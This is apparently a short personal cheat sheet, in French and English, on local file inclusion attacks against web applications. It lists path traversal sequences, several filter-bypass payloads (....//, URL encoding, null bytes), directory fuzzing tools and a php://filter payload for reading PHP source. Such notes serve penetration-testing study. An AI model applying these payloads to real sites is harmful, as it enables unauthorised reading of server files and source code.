# File Inclusion

----
## 

###### Path transversal
```bash
# utiliser pour se deplacer et executer le fichier 
../<NomFile>
```

###### Basic Bypasses

```bash
# filter : replace ../ by ''
Bypass : ....// | ..\/ | convertIntoURLEncoding

# Approved Paths 
Bypass : ./<CurrentDirectory>/<PathTransversal>
```
* Path Trucation 
* Null Bytes 
    * Ajouter %00 à la fin de l'extension du fichier

###### PHP Filters
- Directory fuzzing ( dirbuster, ffuf )
- Lire un fichier php
```URL
# mettre dans l'url
php://filter/read=convert.base64-encode/resource=<FileName>
```
----

##